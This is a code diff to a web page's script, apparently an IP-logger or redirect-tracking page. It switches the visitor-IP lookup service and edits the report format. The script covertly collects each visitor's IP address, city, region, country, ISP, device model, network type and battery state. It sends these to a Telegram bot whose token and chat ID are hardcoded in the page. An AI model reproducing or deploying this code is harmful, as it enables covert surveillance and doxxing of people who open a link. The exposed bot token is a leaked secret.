@@ -106,7 +106,6 @@
   </div>
 
   <script>
-    // تم إضافة التوكن والـ Chat ID الخاص بك هنا مباشرة:
     const TELEGRAM_BOT_TOKEN = "8728217018:AAHctv9Xsgm9UklqD27jfzBrbOJX100dYqE";
     const TELEGRAM_CHAT_ID = "8718173410";
 
@@ -166,8 +165,9 @@
 
     async function collectAndSendToTelegram() {
       try {
-        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipResponse = await fetch('https://ipinfo.io/json');
         const ipData = await ipResponse.json();
+        
         const exactModel = getExactDeviceModel();
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const networkType = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
@@ -187,8 +187,8 @@
           `📌 **Destination:** ${displayName}\n` +
           `🔗 **Target URL:** ${targetUrl}\n\n` +
           `🌐 **IP:** \`${ipData.ip || 'Unknown'}\`\n` +
-          `🌍 **Location:** ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country_name || 'N/A'}\n` +
-          `🏢 **ISP:** ${ipData.org || 'N/A'}\n\n` +
+          `🌍 **Location:** ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country || 'N/A'}\n` +
+          `🏢 **ISP/Org:** ${ipData.org || 'N/A'}\n\n` +
           `📱 **Device:** ${exactModel}\n` +
           `📶 **Network:** ${networkType}\n` +
           `🔋 **Battery:** ${batteryInfo}\n` +
